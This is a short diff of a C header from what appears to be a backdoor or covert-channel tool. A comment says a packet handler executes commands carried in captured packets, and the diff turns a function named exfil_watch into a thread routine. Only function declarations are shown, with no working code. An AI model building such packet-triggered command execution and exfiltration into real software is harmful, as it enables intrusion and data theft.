@@ -71,7 +71,7 @@ NOTES: This function will be called any time a matching packet is captured,
 	execute the command contained within.
 */
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet);
-void exfil_watch(uint32 ipaddr, char *folder);
+void *exfil_watch(void *arg);
 void notify(char *folder);
 
 #endif
